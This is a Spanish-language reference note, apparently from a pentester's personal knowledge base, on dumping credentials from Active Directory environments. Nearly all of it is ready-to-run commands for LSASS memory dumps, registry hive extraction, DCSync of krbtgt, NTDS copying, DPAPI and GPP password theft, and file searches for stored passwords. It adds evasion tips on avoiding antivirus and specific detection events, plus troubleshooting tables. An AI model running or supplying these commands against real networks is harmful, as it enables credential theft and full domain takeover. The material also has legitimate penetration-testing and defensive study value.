---
tipo: meta
aliases:
  - Volcado de credenciales
  - mimikatz
  - secretsdump
tags:
  - meta/referencia
  - dominio/ad
---

# AD volcado de credenciales - matriz de referencia

> [!info] Referencia pura, no un zettel
> De dónde sale material de autenticación una vez que hay admin local. El criterio está en [[LSASS - volcado vía comsvcs.dll MiniDump]] y [[DCSync]].

## 0. Dónde vive cada cosa

Antes de elegir método conviene saber qué se está buscando: no todos los depósitos guardan lo mismo ni cuestan lo mismo.

| Depósito | Qué guarda | Qué hace falta |
|---|---|---|
| Memoria de LSASS | Hashes NT, tickets Kerberos, a veces contraseñas en claro | Admin local |
| SAM (registro) | Hashes NT de las cuentas **locales** | Admin local |
| LSA Secrets | Contraseñas de servicios y de la cuenta de máquina | Admin local |
| Credenciales cacheadas (MSCache2) | Últimos inicios de sesión de dominio, formato lento de romper | Admin local |
| NTDS.dit en el DC | **Todo el dominio** | Admin de dominio o derechos de replicación |
| DPAPI | Contraseñas de navegador, credenciales guardadas, RDP | Usuario o su clave maestra |

LSASS es el de mejor relación valor/esfuerzo, y por eso es el más vigilado.

## 1. LSASS — volcar el proceso

`rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\out.dmp full`
Binario firmado que ya está en el sistema. Ver [[LSASS - volcado vía comsvcs.dll MiniDump]] para cuándo elegirlo.

`procdump.exe -accepteula -ma lsass.exe out.dmp`
Herramienta de Sysinternals, firmada por Microsoft. Se sube, así que deja archivo.

`nxc smb 10.0.0.20 -u admin -p 'pass' -M lsassy`
Vuelca y parsea de forma remota sin dejar el `.dmp` en disco del objetivo.

`Get-Process lsass | Out-Minidump`
PowerShell puro, sin binarios externos. Genera `4104`.

Después, fuera del objetivo:

`pypykatz lsa minidump out.dmp`
`mimikatz # sekurlsa::minidump out.dmp` → `sekurlsa::logonpasswords`

> [!danger] Volcar y parsear en la misma máquina es el error caro
> Parsear el volcado dentro del objetivo obliga a subir mimikatz, que es lo que toda solución de seguridad conoce de memoria. Volcar con un binario firmado y **parsear afuera** convierte el problema de "evadir un antivirus" en "mover un archivo". El coste es el archivo: [[Sysmon EID 11 - FileCreate]] lo ve, y esa escritura es telemetría corroborante de [[Acceso a LSASS desde proceso no firmado]].

## 2. Registro local — sin tocar LSASS

`reg save HKLM\SAM sam.hiv`
`reg save HKLM\SYSTEM system.hiv`
`reg save HKLM\SECURITY security.hiv`

`secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL`

No abre LSASS, así que **no genera `Sysmon EID 10`**. Es la alternativa cuando el acceso al proceso está vigilado. A cambio no trae tickets ni contraseñas en claro: solo hashes de cuentas locales, secretos LSA y credenciales cacheadas.

`nxc smb 10.0.0.20 -u admin -p 'pass' --sam --lsa`
Lo mismo en remoto y en un paso.

## 3. El dominio entero

`secretsdump.py dominio.local/admin:'pass'@10.0.0.10`
Replicación desde un controlador. Es [[DCSync]]: no hace falta estar en el DC, hacen falta los derechos de replicación.

`secretsdump.py -just-dc-user krbtgt dominio.local/admin:'pass'@10.0.0.10`
Solo `krbtgt`. Es lo único que se necesita para [[Golden ticket]], y pedir una cuenta en vez de veinte mil reduce el ruido a casi nada.

`mimikatz # lsadump::dcsync /domain:dominio.local /user:krbtgt`

`ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q`
Copia de la base desde el propio DC, cuando ya hay ejecución ahí. No usa replicación, así que **no genera `4662`** — la detección de DCSync no lo ve.

| Quién puede hacer DCSync | Por qué |
|---|---|
| Domain Admins, Enterprise Admins | Por pertenencia |
| Controladores de dominio | Por función |
| Cualquier objeto con `DS-Replication-Get-Changes-All` | **Por ACL mal puesta** — es el caso interesante y el que BloodHound encuentra |

## 4. DPAPI y lo que queda suelto

`mimikatz # dpapi::cred /in:C:\Users\u\AppData\Roaming\Microsoft\Credentials\<id>`
`mimikatz # sekurlsa::dpapi`

`nxc smb 10.0.0.20 -u admin -p 'pass' -M gpp_password`
Contraseñas en preferencias de política de grupo. La clave de cifrado es pública desde 2014 y las políticas viejas siguen en SYSVOL.

`nxc smb 10.0.0.20 -u admin -p 'pass' -M lsassy -M nanodump`

Buscar a mano también rinde:

`findstr /si password *.xml *.ini *.txt *.config`
`Get-ChildItem -Recurse -Include *.kdbx,*.ppk,unattend.xml`

## 5. Formatos, y qué se hace con cada uno

| Formato | Ejemplo | Qué permite |
|---|---|---|
| Hash NT | `aad3b...:31d6c...` | [[Pass-the-hash]] directo, o romper con `-m 1000` |
| Ticket Kerberos | `.kirbi` / `.ccache` | [[Pass-the-ticket]], sin romper nada |
| MSCache2 | `$DCC2$10240#user#hash` | Solo romper, y es lento: `-m 2100`. No sirve para pasar |
| Contraseña en claro | — | Todo, incluida la autenticación web |
| Clave AES-256 | `sekurlsa::ekeys` | Pass-the-key, y sobrevive en dominios que apagaron RC4 |

MSCache2 es la trampa: parece un hash aprovechable y no lo es. Solo se rompe, y está diseñado para que eso sea caro.

## 6. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `ERROR kuhl_m_sekurlsa_acquireLSA` | Sin privilegio de depuración. `privilege::debug` primero, y hace falta ser admin local |
| El volcado sale de 0 bytes | Protección de LSASS (RunAsPPL) o el EDR bloqueó el acceso al proceso |
| `pypykatz` no encuentra credenciales | Volcado parcial, o la versión de Windows es más nueva que el parser. Actualizar |
| Contraseñas en claro vacías | WDigest deshabilitado, que es lo normal desde Windows 8.1. Quedan los hashes |
| `STATUS_ACCESS_DENIED` en `secretsdump` remoto | No hay admin local en el objetivo, o falta el recurso `ADMIN$` |
| DCSync devuelve `rpc_s_access_denied` | Faltan los derechos de replicación. Verificar la ACL en BloodHound antes de insistir |
| `reg save` falla en `SECURITY` | Falta ejecutar como SYSTEM, no alcanza con administrador |

## Relacionadas

[[MOC - Active Directory]] · [[LSASS - volcado vía comsvcs.dll MiniDump]] · [[DCSync]] · [[AD movimiento lateral - matriz de referencia]] · [[Sysmon EID 10 - ProcessAccess]]
